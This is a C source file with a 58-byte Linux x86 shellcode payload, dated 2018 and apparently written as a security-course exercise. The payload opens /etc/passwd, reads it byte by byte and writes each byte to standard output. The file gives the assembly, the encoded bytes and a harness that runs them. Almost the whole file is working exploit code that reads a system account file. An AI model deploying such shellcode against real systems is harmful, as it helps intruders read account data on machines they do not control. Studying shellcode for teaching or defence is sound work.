/*
; Title     : Linux/x86 - Read /etc/passwd Shellcode (58 bytes)
; Date      : Jan, 2018
; Author    : Joao Batista
; SLAE ID   : SLAE-1420
; Size      : 58 bytes
; Tested on : i686 GNU/Linux

global _start

section .text

_start:
        xor ecx,ecx
        mul ecx
        jmp short two
one:
        pop ebx
        mov al,0x5
        int 0x80
        xchg esi,eax
        jmp short read
exit:
        mov al,byte 0x1
        int 0x80
read:
        mov ebx,esi
        mov al, 0x3
        mov ecx, esp
        mov dl,0x1
        int 0x80

        xor ebx,ebx
        cmp eax,ebx
        je exit

        add al,0x3
        mov bl,dl
        int 0x80

        jmp short read
two:
        call one
        string: db "/etc/passwd"
*/
#include<stdio.h>
#include<string.h>

unsigned char shellcode[] = \
"\x31\xc9\xf7\xe1\xeb\x24\x5b\xb0\x05\xcd\x80\x96\xeb\x04\xb0\x01\xcd\x80\x89\xf3\xb0\x03\x89\xe1\xb2\x01\xcd\x80\x31\xdb\x39\xd8\x74\xec\x04\x03\x88\xd3\xcd\x80\xeb\xe8\xe8\xd7\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64";

main()
{
	printf("shellcode length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}